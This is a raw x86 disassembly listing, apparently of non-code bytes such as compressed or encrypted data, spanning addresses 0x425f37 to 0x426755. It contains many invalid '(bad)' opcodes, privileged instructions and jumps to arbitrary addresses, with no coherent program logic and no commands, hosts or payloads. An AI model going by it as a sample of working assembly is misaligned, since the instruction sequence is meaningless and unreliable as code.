  425f37:	sar    DWORD PTR [ecx+0x49],cl
  425f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f3b:	loop   0x425f53
  425f3d:	pop    ds
  425f3e:	sbb    DWORD PTR ds:0xb1f38cdd,ebx
  425f44:	dec    ebp
  425f45:	mov    DWORD PTR [edi-0x5c],0x70983b30
  425f4c:	retf   0xde38
  425f4f:	fisub  WORD PTR [eax+eax*1]
  425f52:	inc    esp
  425f53:	or     edi,eax
  425f55:	mov    bh,0x6d
  425f57:	outs   dx,BYTE PTR ds:[esi]
  425f58:	out    dx,al
  425f59:	stos   BYTE PTR es:[edi],al
  425f5a:	push   ebx
  425f5b:	push   ecx
  425f5c:	mov    BYTE PTR [ebp-0x16c2b2f9],al
  425f62:	sub    esi,ebp
  425f64:	es es ret 0x6783
  425f69:	adc    eax,0xfedcb5d3
  425f6e:	sub    eax,0x2e25663f
  425f73:	jle    0x425f30
  425f75:	rcr    BYTE PTR [ecx+0x66],0xb4
  425f79:	cmp    cl,BYTE PTR [edx-0x3ca1ed5b]
  425f7f:	ret    
  425f80:	rcr    ebp,cl
  425f82:	arpl   WORD PTR [ebp+0x1250427c],bx
  425f88:	fs (bad) 
  425f8a:	ss cli 
  425f8c:	fcmove st,st(2)
  425f8e:	mov    es,WORD PTR [edi+0x2a]
  425f91:	adc    eax,0x3982f53c
  425f96:	xchg   ebx,eax
  425f97:	inc    ebp
  425f98:	jg     0x425fea
  425f9a:	popa   
  425f9b:	fistp  DWORD PTR [edi+0x6a]
  425f9e:	rcr    edi,1
  425fa0:	les    ebx,FWORD PTR [edi-0x6c79107c]
  425fa6:	mov    es,WORD PTR ds:0xb98fd662
  425fac:	or     eax,0xec38753f
  425fb1:	daa    
  425fb2:	dec    ebp
  425fb3:	push   0x4d894447
  425fb8:	scas   al,BYTE PTR es:[edi]
  425fb9:	push   ebp
  425fba:	mov    bh,0x40
  425fbc:	add    BYTE PTR [esi],dl
  425fbe:	push   ecx
  425fbf:	inc    ebp
  425fc0:	jg     0x425ffa
  425fc2:	ja     0x426027
  425fc4:	pop    edi
  425fc5:	mov    ds:0x26a5b86d,al
  425fca:	jno    0x425fb1
  425fcc:	pushf  
  425fcd:	or     BYTE PTR [esi+0x4],dh
  425fd0:	and    DWORD PTR [esi],edi
  425fd2:	fwait
  425fd3:	rcl    BYTE PTR ds:0x2a56fcf8,1
  425fd9:	iret   
  425fda:	xor    ecx,eax
  425fdc:	or     eax,0xf622b352
  425fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe2:	mov    bh,0xb0
  425fe4:	fist   WORD PTR ds:0x55e0fdb9
  425fea:	test   BYTE PTR [edi-0x78],0x21
  425fee:	add    bl,BYTE PTR [ecx]
  425ff0:	loope  0x425fa0
  425ff2:	imul   esi,ecx,0xffffffac
  425ff5:	outs   dx,BYTE PTR ds:[esi]
  425ff6:	cwde   
  425ff7:	pop    ecx
  425ff8:	sub    ebp,0x6b
  425ffb:	xchg   eax,ebx
  425ffd:	xor    ch,bh
  425fff:	push   0xc29af500
  426004:	jae    0x426040
  426006:	add    al,0xf
  426008:	add    al,BYTE PTR [edx+0x499f86ed]
  42600e:	adc    al,BYTE PTR [esi+ebx*1]
  426011:	hlt    
  426012:	test   eax,0x33be666f
  426017:	mov    al,0x91
  426019:	fs inc edx
  42601b:	add    bl,BYTE PTR [esi+0x28c1f0cf]
  426021:	in     eax,0x69
  426023:	test   eax,0x63e0b1dc
  426028:	cmp    BYTE PTR [ecx+0x6a],0xac
  42602c:	icebp  
  42602d:	mov    ch,0xd1
  42602f:	xchg   ecx,eax
  426030:	xlat   BYTE PTR ds:[ebx]
  426031:	fimul  DWORD PTR [edx+0x4693b67f]
  426037:	cs repz (bad) 
  42603a:	rcr    ebp,cl
  42603c:	fistp  DWORD PTR [esi+0x3eb46b90]
  426042:	into   
  426043:	lods   al,BYTE PTR ds:[esi]
  426044:	aas    
  426045:	adc    DWORD PTR [edi],0xdd0c39fc
  42604b:	and    BYTE PTR [esi+0x68],dl
  42604e:	jae    0x42605f
  426050:	sbb    DWORD PTR [edi+0x3b],ecx
  426053:	cmp    edi,DWORD PTR [esi+0x45]
  426056:	ret    0xc53d
  426059:	xchg   ebx,eax
  42605a:	and    BYTE PTR ds:0x8a43e909,bl
  426060:	push   esi
  426061:	push   esp
  426062:	mov    BYTE PTR [edx],ch
  426064:	jns    0x426000
  426066:	fmul   st,st(2)
  426068:	push   ss
  426069:	(bad)  
  42606b:	(bad)  
  42606c:	jmp    0x28847f23
  426071:	mov    bl,0x3b
  426073:	add    eax,0x87fea9ad
  426078:	jle    0x426082
  42607a:	cmp    al,0xa
  42607c:	push   ebx
  42607d:	pop    es
  42607e:	cmp    ebx,0x7789a2ed
  426084:	dec    esi
  426085:	je     0x426046
  426087:	sub    cl,BYTE PTR [ecx]
  426089:	cmp    al,0x31
  42608b:	adc    eax,0xcac31e5c
  426090:	test   ah,bh
  426092:	leave  
  426093:	repnz mov ecx,0x2c5b385e
  426099:	test   BYTE PTR [esi+0x71cfab22],cl
  42609f:	inc    eax
  4260a0:	imul   esi,eax,0xfffffffc
  4260a3:	adc    eax,0x88f46ae0
  4260a8:	shl    BYTE PTR [esp+ebx*4+0xa824901],1
  4260af:	dec    eax
  4260b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260b1:	push   ebx
  4260b2:	retf   
  4260b3:	cld    
  4260b4:	mov    al,ds:0x8144a9b1
  4260b9:	cmp    DWORD PTR [ebp+0x1f],ecx
  4260bc:	and    al,0x69
  4260be:	int    0xc7
  4260c0:	jb     0x42604c
  4260c2:	push   edi
  4260c3:	(bad)  
  4260c4:	lock mov esi,0x1d19cc61
  4260ca:	clc    
  4260cb:	push   ebp
  4260cc:	jo     0x426057
  4260ce:	add    eax,0xdab78854
  4260d3:	push   es
  4260d4:	or     cl,al
  4260d6:	dec    esi
  4260d7:	es test eax,0xb90c019d
  4260dd:	dec    edi
  4260de:	mov    bl,0x36
  4260e0:	mov    bl,ah
  4260e2:	push   ebp
  4260e3:	adc    esi,DWORD PTR [edi+0x4b]
  4260e6:	mov    dh,0xcd
  4260e8:	and    eax,0x376670ea
  4260ed:	add    al,0x1
  4260ef:	outs   dx,BYTE PTR ds:[esi]
  4260f0:	adc    BYTE PTR [edi-0x1c65d451],dh
  4260f6:	cwde   
  4260f7:	dec    esi
  4260f8:	das    
  4260f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260fa:	cmp    ebx,DWORD PTR [edx+0x24643a56]
  426100:	ins    BYTE PTR es:[edi],dx
  426101:	dec    ebp
  426102:	pminsw mm4,QWORD PTR [esi+0x6b]
  426106:	push   esi
  426107:	push   esi
  426108:	mov    eax,ds:0x468609cb
  42610d:	lds    esp,FWORD PTR [ebx+0x32]
  426110:	popf   
  426111:	mov    ebp,DWORD PTR [ebp-0x7b]
  426114:	cwde   
  426115:	pop    edi
  426116:	xor    al,0x36
  426118:	call   0xe855cbd1
  42611d:	cmp    eax,0x68308b20
  426122:	xchg   BYTE PTR [eax],dl
  426124:	scas   al,BYTE PTR es:[edi]
  426125:	mov    DWORD PTR [ebp+0x41347bf5],ebp
  42612b:	jle    0x42615d
  42612d:	push   esp
  42612e:	bound  ebx,QWORD PTR [eax-0x1a07816e]
  426134:	test   BYTE PTR [esi-0x207c4fed],dh
  42613a:	test   al,0x40
  42613c:	cwde   
  42613d:	push   edi
  42613e:	cmp    esp,DWORD PTR [eax-0x67f3f972]
  426144:	pop    esi
  426145:	inc    dh
  426147:	pop    esp
  426148:	adc    DWORD PTR [esi-0x573984c0],edx
  42614e:	test   al,0xc2
  426150:	ins    DWORD PTR es:[edi],dx
  426151:	push   esi
  426152:	inc    edi
  426153:	into   
  426154:	push   esp
  426155:	cwde   
  426156:	dec    ebp
  426157:	in     eax,dx
  426158:	rcl    BYTE PTR [ecx],1
  42615a:	jbe    0x42615f
  42615c:	ss xor eax,0x33942c10
  426162:	xor    cl,BYTE PTR [eax]
  426164:	in     al,0x42
  426166:	fdecstp 
  426168:	popf   
  426169:	inc    ecx
  42616a:	fmul   QWORD PTR [eax+ecx*4]
  42616d:	popa   
  42616e:	das    
  42616f:	shl    DWORD PTR [ebx+0x72],0xa9
  426173:	fst    st(4)
  426175:	iret   
  426176:	cwde   
  426177:	xor    BYTE PTR [ecx+0x33e037ed],0x13
  42617e:	or     dh,BYTE PTR ds:[edx+0x2e]
  426182:	daa    
  426183:	xor    al,0x99
  426185:	xchg   edx,esp
  426187:	fnstcw WORD PTR [eax]
  426189:	test   ecx,esi
  42618b:	ja     0x426149
  42618d:	push   edi
  42618e:	push   ecx
  42618f:	imul   esi,DWORD PTR fs:[ebx],0xffffffb7
  426193:	sar    DWORD PTR [edi],1
  426195:	pusha  
  426196:	rcr    BYTE PTR [edi],1
  426198:	shl    BYTE PTR ds:[ebx],cl
  42619b:	shl    BYTE PTR [edx+0x8e94557],cl
  4261a1:	fcomp  QWORD PTR [ecx+0x61fa0e3d]
  4261a7:	popa   
  4261a8:	pop    esp
  4261a9:	jecxz  0x426203
  4261ab:	retf   
  4261ac:	add    BYTE PTR cs:[edi+ebp*2+0x3dcc2ca8],cl
  4261b4:	sub    eax,0xfc20b7ed
  4261b9:	cmp    BYTE PTR [esi+eiz*1-0x3d483c85],cl
  4261c0:	lods   eax,DWORD PTR ds:[esi]
  4261c1:	mov    eax,0xdda5e7a9
  4261c6:	std    
  4261c7:	nop
  4261c8:	stc    
  4261c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261ca:	mov    DWORD PTR [eax-0x80],eax
  4261cd:	xchg   edx,eax
  4261ce:	inc    edi
  4261cf:	sub    BYTE PTR [edi-0x293f7c9b],bl
  4261d5:	sbb    BYTE PTR [esi-0x2069facf],cl
  4261db:	pusha  
  4261dc:	mov    esp,0x162e870d
  4261e1:	pop    ss
  4261e2:	mov    ebx,0xdc937e18
  4261e7:	adc    al,0xe7
  4261e9:	cld    
  4261ea:	push   ebx
  4261eb:	push   edi
  4261ec:	cmp    eax,0xcf17fc83
  4261f1:	or     BYTE PTR [eax-0x4a7bc729],dl
  4261f7:	push   0x2e
  4261f9:	jecxz  0x4261c2
  4261fb:	cmc    
  4261fc:	ret    
  4261fd:	es repnz xbegin 0xe0ae81fd
  426205:	iret   
  426206:	mov    esi,0xd2cbce7e
  42620b:	out    dx,eax
  42620c:	mov    ebp,0x7808ec68
  426211:	push   ds
  426212:	pusha  
  426213:	jae    0x426266
  426215:	cmp    eax,0xe44358b3
  42621a:	lds    esp,FWORD PTR [eax]
  42621c:	mov    bl,0x98
  42621e:	rol    BYTE PTR [edi],1
  426220:	stc    
  426221:	or     cl,BYTE PTR [ecx+edi*8+0x451dbb30]
  426228:	mov    al,ds:0xe22ef063
  42622d:	(bad)  
  42622f:	jmp    DWORD PTR [eax-0x3d]
  426232:	in     al,0xff
  426234:	or     esp,DWORD PTR [ebp+0x43]
  426237:	or     al,0x15
  426239:	push   edx
  42623a:	popf   
  42623b:	ja     0x426203
  42623d:	add    DWORD PTR [edx+0x48],ebp
  426240:	add    BYTE PTR [ecx],ah
  426242:	mov    edx,0xcebe7f03
  426247:	mov    al,ds:0x73acf068
  42624c:	add    BYTE PTR [ebx],dh
  42624e:	ins    BYTE PTR es:[edi],dx
  42624f:	mov    cr0,ebx
  426252:	fist   DWORD PTR [edi-0x5df922a9]
  426258:	push   edi
  426259:	daa    
  42625a:	mov    cl,0xd4
  42625c:	sub    esi,ecx
  42625e:	sub    al,0xed
  426260:	in     al,dx
  426261:	outs   dx,BYTE PTR ds:[esi]
  426262:	push   0xd03461d4
  426267:	int3   
  426268:	sbb    al,0x76
  42626a:	inc    ecx
  42626b:	popa   
  42626c:	leave  
  42626d:	shr    BYTE PTR [esi+0x24],cl
  426270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426271:	or     al,0xff
  426273:	xchg   edi,eax
  426274:	nop
  426275:	fild   DWORD PTR [esi-0x55]
  426278:	mov    edx,0xa12a81c7
  42627d:	int    0xfa
  42627f:	push   es
  426280:	inc    ebx
  426281:	cmp    BYTE PTR [ebx],ah
  426283:	outs   dx,DWORD PTR ds:[esi]
  426284:	dec    ebx
  426285:	aad    0x87
  426287:	imul   DWORD PTR [esi]
  426289:	mov    edi,DWORD PTR [si-0x4ccd]
  42628e:	mov    esp,0x47fad2d6
  426293:	aad    0x77
  426295:	mov    dl,0x98
  426297:	inc    edx
  426298:	xor    BYTE PTR [edx+0x60],ch
  42629b:	pushf  
  42629c:	leave  
  42629d:	out    dx,al
  42629e:	dec    edi
  42629f:	or     eax,0x928a3535
  4262a4:	icebp  
  4262a5:	cmp    al,0xe4
  4262a7:	or     BYTE PTR [ebx+0x50],dl
  4262aa:	popf   
  4262ab:	in     al,0x8d
  4262ad:	pop    esp
  4262ae:	arpl   WORD PTR [ecx-0x2],si
  4262b1:	je     0x426239
  4262b3:	mov    eax,ds:0xbec832c4
  4262b8:	push   ebx
  4262b9:	hlt    
  4262ba:	dec    ebx
  4262bb:	jmp    0xba4f0534
  4262c0:	mov    eax,0x279b47c5
  4262c5:	dec    eax
  4262c6:	dec    eax
  4262c7:	mov    dh,0xa4
  4262c9:	xor    al,0x3c
  4262cb:	sub    BYTE PTR [edx],0x9c
  4262ce:	aad    0xc0
  4262d0:	mov    WORD PTR [ecx-0x74],ss
  4262d3:	mov    bl,0xdb
  4262d5:	or     al,0x13
  4262d7:	fmul   QWORD PTR [edx-0x5a6d04da]
  4262dd:	icebp  
  4262de:	sub    dl,BYTE PTR [ecx+esi*1-0x40]
  4262e2:	inc    ebp
  4262e3:	mov    esp,?
  4262e5:	icebp  
  4262e6:	dec    edi
  4262e7:	push   ecx
  4262e8:	sbb    DWORD PTR [edi],ebx
  4262ea:	mov    esp,0xa7d3f40c
  4262ef:	fsub   st,st(2)
  4262f1:	push   0xffffffa6
  4262f3:	add    eax,DWORD PTR [edi+0x3f]
  4262f6:	les    edx,FWORD PTR [ebx]
  4262f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262f9:	mov    bh,0xce
  4262fb:	ret    0x55
  4262fe:	call   0x3d87345b
  426303:	(bad)  
  426307:	xor    ch,0x93
  42630a:	retf   
  42630b:	nop
  42630c:	or     al,0x62
  42630e:	mov    WORD PTR ds:0xc49c2290,?
  426314:	add    al,0xe7
  426316:	shr    DWORD PTR [ecx+0x575c5451],cl
  42631c:	loopne 0x4262fa
  42631e:	xchg   DWORD PTR [edi],ebp
  426320:	pop    es
  426321:	ins    BYTE PTR es:[edi],dx
  426322:	ins    DWORD PTR es:[edi],dx
  426323:	arpl   WORD PTR [ebp+0x61],dx
  426326:	mov    al,0x4b
  426328:	clc    
  426329:	rcr    al,cl
  42632b:	add    eax,0xd74845f4
  426330:	mov    bl,0x29
  426332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426333:	xchg   ecx,eax
  426334:	(bad)  
  426335:	into   
  426336:	xor    BYTE PTR [bx+di],dh
  426339:	ret    0x1c2f
  42633c:	inc    edx
  42633d:	icebp  
  42633e:	jle    0x42636d
  426340:	popf   
  426341:	inc    ecx
  426342:	nop
  426343:	sub    BYTE PTR [edx],bl
  426345:	test   DWORD PTR ds:0x6158fdfb,esp
  42634b:	hlt    
  42634c:	or     bh,BYTE PTR [ecx+0xc150905]
  426352:	or     cl,dl
  426354:	xlat   BYTE PTR ds:[ebx]
  426355:	(bad)  
  426356:	fsubr  QWORD PTR [edi+0x1904ddcb]
  42635c:	call   FWORD PTR [edi+0x5c916fb8]
  426362:	adc    al,0xec
  426364:	sti    
  426365:	in     al,dx
  426366:	or     ecx,DWORD PTR [esi+0xc1998e0]
  42636c:	inc    esi
  42636d:	adc    dh,BYTE PTR [esi]
  42636f:	jmp    0xbeb30015
  426374:	rcl    esi,1
  426376:	jnp    0x426381
  426378:	xchg   ecx,eax
  426379:	push   0x7e
  42637b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42637d:	dec    ecx
  42637e:	fwait
  42637f:	xor    eax,DWORD PTR [esp+ebp*4-0xf7b2f4e]
  426386:	adc    eax,0x60adb36c
  42638b:	mov    edx,0xf61b53cd
  426390:	ret    0x5bb
  426393:	xchg   edi,eax
  426394:	mov    ds:0x38d34caa,al
  426399:	and    DWORD PTR [edx-0xb],0xff317a21
  4263a0:	cmp    al,0x46
  4263a2:	mov    ebx,0x468494c3
  4263a7:	je     0x4263eb
  4263a9:	clc    
  4263aa:	inc    esp
  4263ab:	mov    edi,0x6e811770
  4263b0:	(bad)  
  4263b1:	aas    
  4263b2:	out    0x1e,eax
  4263b4:	es (bad) 
  4263b6:	jecxz  0x426356
  4263b8:	imul   eax,ebx,0xde0732c9
  4263be:	gs ins DWORD PTR es:[edi],dx
  4263c0:	xor    eax,edi
  4263c2:	pop    ecx
  4263c3:	call   0x4f499625
  4263c8:	xlat   BYTE PTR ds:[ebx]
  4263c9:	mov    bh,0x8f
  4263cb:	daa    
  4263cc:	add    BYTE PTR [eax],0x4b
  4263cf:	aad    0x72
  4263d1:	add    bl,bl
  4263d3:	lods   al,BYTE PTR ds:[esi]
  4263d4:	jo     0x42638f
  4263d6:	or     eax,0xf068b39
  4263db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263dc:	leave  
  4263dd:	into   
  4263de:	jecxz  0x4263f7
  4263e0:	call   0x68be:0x9398027c
  4263e7:	repz add DWORD PTR ds:0x8831dba1,0xa84b5015
  4263f2:	out    0x4e,eax
  4263f4:	sbb    DWORD PTR ds:0x6f3bf7f0,0x43
  4263fb:	mov    ds:0xd16a15f5,al
  426400:	dec    esi
  426401:	inc    ecx
  426402:	sub    eax,ecx
  426404:	adc    DWORD PTR [ebx],edx
  426406:	xchg   esi,eax
  426407:	jmp    0xc317f858
  42640c:	cmp    ebp,DWORD PTR [edi-0x159122bd]
  426412:	add    BYTE PTR [edx+0x7716942f],bh
  426418:	push   0x38
  42641a:	push   ecx
  42641b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42641c:	xor    al,0x11
  42641e:	mov    ebp,0xe2d3a22b
  426423:	adc    eax,0xcb545525
  426428:	repz iret 
  42642a:	popf   
  42642b:	(bad)  
  42642c:	out    dx,eax
  42642d:	add    DWORD PTR [eax+0x522d3cfa],0x6a
  426434:	inc    esi
  426435:	jl     0x42648d
  426437:	cmp    bh,bl
  426439:	clc    
  42643a:	out    0x34,eax
  42643c:	cmc    
  42643d:	ficomp WORD PTR [eax+0x24c30324]
  426443:	out    dx,al
  426444:	pop    edx
  426445:	and    BYTE PTR [ebx],ch
  426447:	mov    eax,DWORD PTR [eax-0x41b269d]
  42644d:	jmp    FWORD PTR [eax+0x5c]
  426450:	adc    ch,cl
  426452:	xchg   ecx,eax
  426453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426454:	cmp    dl,al
  426456:	inc    ebx
  426457:	mov    DWORD PTR [ecx],ebp
  426459:	loopne 0x4264af
  42645b:	arpl   cx,dx
  42645d:	inc    ebp
  42645e:	sbb    dh,bl
  426460:	jae    0x426499
  426462:	cmp    esp,ebx
  426464:	(bad)  
  426465:	cmc    
  426466:	mov    ds:0x57c525b9,al
  42646b:	jecxz  0x42645d
  42646d:	call   DWORD PTR [eax+ebp*1+0x2c532f92]
  426474:	push   esp
  426475:	jne    0x4264c4
  426477:	cwde   
  426478:	je     0x42642b
  42647a:	jbe    0x426417
  42647c:	pop    ebp
  42647d:	aas    
  42647e:	aaa    
  42647f:	mov    esi,0xbac4651
  426484:	fwait
  426485:	aas    
  426486:	test   BYTE PTR ds:0x322b15c,bl
  42648c:	push   DWORD PTR [ebx+0x7a]
  42648f:	imul   esi,DWORD PTR [edi+0x6ea67bc0],0x75
  426496:	push   es
  426497:	aas    
  426498:	lods   eax,DWORD PTR ds:[esi]
  426499:	pushf  
  42649a:	repz test DWORD PTR [edx],eax
  42649d:	cld    
  42649e:	mov    DWORD PTR [edi-0x44806c9a],esp
  4264a4:	aaa    
  4264a5:	rcl    BYTE PTR [ebp-0x5e4b46a4],cl
  4264ab:	or     esp,0xbf8d6e22
  4264b1:	je     0x4264f4
  4264b3:	nop
  4264b4:	mov    ah,0xf8
  4264b6:	and    DWORD PTR [ebx-0x3e82350f],esi
  4264bc:	mov    cl,0x15
  4264be:	and    esi,0xffffffde
  4264c1:	mov    BYTE PTR [edx-0x570f737f],al
  4264c7:	cmp    edi,0x956d4ce3
  4264cd:	imul   esp,ecx,0x7e
  4264d0:	inc    ebx
  4264d1:	enter  0x74c5,0xaf
  4264d5:	push   esp
  4264d6:	aas    
  4264d7:	sti    
  4264d8:	add    eax,0x3c1721cb
  4264dd:	and    al,0x0
	...
  4264e7:	add    BYTE PTR [eax],al
  4264e9:	add    BYTE PTR [ecx+0x55],cl
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	fcomp  QWORD PTR [edi-0xdf780f8]
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	jl     0x426506
  426500:	add    BYTE PTR [eax],al
  426502:	sub    eax,0x48efac98
  426507:	cmc    
  426508:	int    0xea
  42650a:	mov    esp,DWORD PTR [edi-0x615ff9d2]
  426510:	sub    DWORD PTR [edx+0x58f70bbf],edx
  426516:	push   esi
  426517:	jb     0x42655c
  426519:	add    eax,DWORD PTR [ebp+0x1c]
  42651c:	dec    esp
  42651d:	mov    esi,0x311d72c8
  426522:	sub    eax,0xa720c871
  426527:	push   ss
  426528:	cld    
  426529:	fs jecxz 0x4264f5
  42652c:	mov    edi,0x730c2327
  426531:	ins    DWORD PTR es:[edi],dx
  426532:	cwde   
  426533:	jle    0x42659a
  426535:	jb     0x42656a
  426537:	or     al,0x91
  426539:	xchg   edi,eax
  42653a:	shl    bl,1
  42653c:	cmp    DWORD PTR [edi-0x53],esp
  42653f:	mov    esi,0xfbce9ed9
  426544:	mov    ch,0x35
  426546:	xchg   esp,eax
  426547:	sti    
  426548:	jne    0x4264d1
  42654a:	pop    esp
  42654b:	adc    eax,ebx
  42654d:	or     eax,0xd0f72788
  426552:	pusha  
  426553:	test   al,0xee
  426555:	(bad)  
  426556:	sbb    esi,DWORD PTR [ebp+eax*8-0x44a21ce2]
  42655d:	(bad)  
  42655e:	or     al,0x5b
  426560:	ins    DWORD PTR es:[edi],dx
  426561:	shl    BYTE PTR [eax+0x72f00da3],1
  426567:	test   al,0xe5
  426569:	push   eax
  42656a:	in     eax,0xce
  42656c:	adc    al,0x25
  42656e:	cs or  al,0x35
  426571:	jo     0x426582
  426573:	and    esp,DWORD PTR [ecx-0x2c]
  426576:	stc    
  426577:	arpl   si,bx
  426579:	retf   
  42657a:	scas   eax,DWORD PTR es:[edi]
  42657b:	mov    esp,0x33f370e6
  426580:	ins    DWORD PTR es:[edi],dx
  426581:	sbb    bl,BYTE PTR [eax]
  426583:	cmp    esp,edi
  426585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426586:	add    al,0x22
  426588:	mov    ah,0x9
  42658a:	xor    al,0x63
  42658c:	mov    eax,0xf3a9a679
  426591:	xor    ecx,DWORD PTR [eax-0x7b]
  426594:	(bad)  
  426595:	sbb    eax,0xb6b4fb6b
  42659a:	pop    ds
  42659b:	lods   eax,DWORD PTR ds:[esi]
  42659c:	adc    al,BYTE PTR [ebx+ecx*2]
  42659f:	test   BYTE PTR [eax-0x6b0f8082],0xdf
  4265a6:	clc    
  4265a7:	ja     0x42659a
  4265a9:	push   edx
  4265aa:	dec    ebx
  4265ab:	mov    ds:0xf491b0b5,al
  4265b0:	push   edi
  4265b1:	arpl   WORD PTR [ebp-0x47350d91],bx
  4265b7:	xchg   edi,eax
  4265b8:	int    0x7e
  4265ba:	mov    dh,0x89
  4265bc:	mov    DWORD PTR [esi],edi
  4265be:	sbb    eax,0x26241a87
  4265c3:	cld    
  4265c4:	and    al,0x77
  4265c6:	or     al,BYTE PTR [edx+0x1b]
  4265c9:	imul   ecx,DWORD PTR [ebx-0x37f14a76],0x55
  4265d0:	jo     0x4265fe
  4265d2:	call   0xe2d0:0xdb3b4fdc
  4265d9:	pop    es
  4265da:	inc    eax
  4265db:	sub    ebx,DWORD PTR [edx]
  4265dd:	push   es
  4265de:	jmp    0x346:0xd71fa905
  4265e5:	outs   dx,BYTE PTR ds:[esi]
  4265e6:	cs inc eax
  4265e8:	imul   eax,DWORD PTR [ebp+0x44],0x48
  4265ec:	sub    edx,DWORD PTR [ecx-0x27ec37e0]
  4265f2:	jb     0x426644
  4265f4:	scas   eax,DWORD PTR es:[edi]
  4265f5:	sub    eax,0x66a9b4be
  4265fa:	shl    BYTE PTR [ecx+0x76],0x69
  4265fe:	cmp    ah,cl
  426600:	rcl    DWORD PTR [eax+0x7b],0xb6
  426604:	(bad)  
  426605:	cmp    DWORD PTR ds:0xadad7b48,eax
  42660b:	mov    esi,0xc10fb8a2
  426610:	les    edx,FWORD PTR gs:[edi+0x12692c52]
  426617:	adc    DWORD PTR [ebx+0x52],ebp
  42661a:	stos   DWORD PTR es:[edi],eax
  42661b:	cmp    eax,0xbc8f16e1
  426620:	cs add al,0x3d
  426623:	aas    
  426624:	push   es
  426625:	fadd   DWORD PTR [ecx-0x102d2fdf]
  42662b:	ret    
  42662c:	fdiv   DWORD PTR [edx]
  42662e:	loop   0x426632
  426630:	jg     0x426658
  426632:	adc    ah,BYTE PTR [esi-0x64b08204]
  426638:	push   ecx
  426639:	(bad)  
  42663b:	inc    esp
  42663c:	pusha  
  42663d:	push   ds
  42663e:	pop    ebx
  42663f:	jmp    0x426694
  426641:	in     al,0x1a
  426643:	push   ebx
  426644:	loop   0x426620
  426646:	enter  0xa4aa,0xb8
  42664a:	jo     0x4266ad
  42664c:	les    esi,FWORD PTR [edi-0xf1f22c7]
  426652:	jmp    0xc3b42ab0
  426657:	xor    eax,0x6e3b5a1a
  42665c:	js     0x4266d4
  42665e:	pop    eax
  42665f:	jmp    0xb12563ec
  426664:	retf   0x6a0d
  426667:	clc    
  426668:	xchg   ebx,eax
  426669:	xchg   ch,cl
  42666b:	add    bl,BYTE PTR [eax+0x1889fd6b]
  426671:	push   edx
  426672:	ret    0x1612
  426675:	dec    edi
  426676:	xor    esp,DWORD PTR [eax]
  426678:	ins    DWORD PTR es:[edi],dx
  426679:	mov    cl,0x7f
  42667b:	xchg   edi,eax
  42667c:	mov    esp,0x9790cec3
  426681:	xchg   ebp,eax
  426682:	mov    bl,0xaf
  426684:	sbb    DWORD PTR [ebx-0x16],ebp
  426687:	xor    al,0xc5
  426689:	es jns 0x426638
  42668c:	int3   
  42668d:	(bad)  
  42668e:	fsub   DWORD PTR [edx]
  426690:	jl     0x426706
  426692:	pop    edx
  426693:	cmp    eax,DWORD PTR [edi+esi*4]
  426696:	test   eax,0x53c62cd2
  42669b:	mov    ds:0x9b2714e2,al
  4266a0:	jge    0x4266bc
  4266a2:	xchg   ebp,ebp
  4266a4:	fst    QWORD PTR [eax+eax*4-0x5a]
  4266a8:	gs mov bh,0x53
  4266ab:	xchg   esp,eax
  4266ac:	inc    esi
  4266ad:	mov    edx,0xcb1a627c
  4266b2:	jp     0x4266e1
  4266b4:	lock cmp dh,ch
  4266b7:	xchg   ebx,eax
  4266b8:	fstp   TBYTE PTR [edx+0x12]
  4266bb:	test   BYTE PTR [ecx+0x61000776],al
  4266c1:	hlt    
  4266c2:	sub    DWORD PTR [ecx],eax
  4266c4:	gs jo  0x4266c4
  4266c7:	xor    al,0xcd
  4266c9:	pop    ebx
  4266ca:	mov    ebp,0xf042c4e2
  4266cf:	cmp    BYTE PTR [edx+0x66249ab],ch
  4266d5:	sbb    DWORD PTR [edi-0x338fe595],esi
  4266db:	jmp    0x426670
  4266dd:	stos   DWORD PTR es:[edi],eax
  4266de:	sub    ecx,edi
  4266e0:	pop    ss
  4266e1:	pop    ss
  4266e2:	cwde   
  4266e3:	xchg   ebp,esp
  4266e5:	xchg   ebp,eax
  4266e6:	mov    BYTE PTR [ecx+ebp*8-0x11aa5b61],bl
  4266ed:	out    0x46,al
  4266ef:	xor    al,0x14
  4266f1:	mov    ds:0x5ce05d76,al
  4266f6:	pushf  
  4266f7:	aam    0x3f
  4266f9:	cmp    eax,0x6ed4ae14
  4266fe:	jb     0x42676a
  426700:	sub    eax,0xa3ca1e6a
  426705:	in     al,0xbc
  426707:	call   DWORD PTR [ecx]
  426709:	repz shr DWORD PTR [esi+0x1face7ad],cl
  426710:	xchg   edi,eax
  426711:	(bad)  fs:[edi+eax*1]
  426715:	inc    edx
  426716:	add    bl,0xf0
  426719:	fiadd  WORD PTR [eax*8-0x1feaf1a8]
  426720:	bound  edx,QWORD PTR [edx-0x2d3b7463]
  426726:	iret   
  426727:	or     DWORD PTR [ebp-0x20],esp
  42672a:	add    DWORD PTR ds:0xa3cc6d6,esp
  426730:	dec    edx
  426731:	push   ebx
  426732:	sub    al,al
  426734:	dec    eax
  426735:	cmp    eax,DWORD PTR [ecx]
  426737:	inc    BYTE PTR [edx-0x55b549de]
  42673d:	hlt    
  42673e:	clc    
  42673f:	outs   dx,DWORD PTR ds:[esi]
  426740:	fadd   QWORD PTR [eax+0x5cdf87e3]
  426746:	xchg   ebx,edi
  426748:	sbb    BYTE PTR [esp+edi*1],ch
  42674b:	push   edx
  42674c:	xchg   esp,eax
  42674d:	(bad)
  426750:	mov    cl,al
  426752:	stos   BYTE PTR es:[edi],al
  426753:	fimul  WORD PTR [edx]
  426755:	xor    eax,0x4beaf3fc
